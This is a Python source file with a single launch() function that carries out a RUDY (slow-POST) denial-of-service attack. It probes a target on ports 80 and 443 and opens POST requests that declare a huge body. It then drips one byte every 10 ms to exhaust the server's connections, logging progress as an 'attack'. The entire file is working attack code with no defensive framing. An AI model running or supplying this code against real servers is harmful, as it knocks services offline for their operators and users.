import socket
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    sent_packets = 0
    prioritized_ports = [80, 443]
    active_port = None

    print(f"[+] Starting RUDY attack {tag} on ports {port_list}")

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        # Detect active port if not set
        if active_port is None:
            port_found = False
            for port in prioritized_ports:
                if port not in port_list:
                    continue

                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target_ip, port))
                    s.close()
                    active_port = port
                    port_found = True
                    print(f"[i] {tag} active port detected: {port}")
                    break
                except Exception:
                    continue

            if not port_found:
                print(f"[x] {tag} stopped: Neither port 80 nor 443 is active.")
                stop_event.set()
                return

        port = active_port
        failed = 0

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, port))

            s.sendall(b"POST / HTTP/1.1\r\n")
            s.sendall(b"Host: %b\r\n" % target_ip.encode())
            s.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n")
            s.sendall(b"Content-Length: 1000000\r\n")
            s.sendall(b"\r\n")

            sent_packets += 1  # Initial successful send

            for _ in range(1000000):
                if stop_event.is_set():
                    break
                try:
                    s.send(b"a")
                    sent_packets += 1
                    time.sleep(0.01)  # Can be parameterized
                except Exception as e:
                    failed += 1
                    print(f"[!] RUDY attack {tag} send failure on port {port}: {e} (fail count {failed})")
                    if failed > 20:
                        fail_tracker.append(f"{tag}-{port}")
                        stop_event.set()
                        print(f"[!] RUDY attack {tag} stopped due to send failures on port {port}")
                        s.close()
                        print(f"[+] Total packets sent: {sent_packets}")
                        return
                    break  # Break inner loop on failure

            s.close()

        except Exception as e:
            failed += 1
            print(f"[!] RUDY attack {tag} connection failure on port {port}: {e} (fail count {failed})")
            if failed > 20:
                fail_tracker.append(f"{tag}-{port}")
                stop_event.set()
                print(f"[!] RUDY attack {tag} stopped due to connection failures on port {port}")
                print(f"[+] Total packets sent: {sent_packets}")
                return
            # Reset active_port to retry detection on next loop
            active_port = None

    print(f"[+] RUDY attack {tag} ended. Total packets sent: {sent_packets}")
